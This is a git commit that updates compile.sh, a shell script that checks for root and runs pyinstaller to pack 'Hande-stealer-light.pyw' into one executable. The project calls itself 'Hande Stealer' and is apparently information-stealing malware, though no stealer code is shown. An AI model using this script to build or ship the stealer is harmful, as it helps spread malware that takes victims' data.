13538a0176ca38298eed40126ce26924e077d81d
zoomer <51061101+calebrwalk5@users.noreply.github.com>
2021-09-23 14:28:50 -0400

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,2 +1,10 @@
 #!/bin/sh
+
+echo "Hande Stealer"
+if test "`whoami`" != "root" ; then
+	echo "You must be logged in as root to build (for loopback mounting)"
+	echo "Enter 'su' or 'sudo bash' to switch to root"
+	exit
+fi
+
 sudo pyinstaller --clean --onefile --version-file file_version.txt Hande-stealer-light.pyw
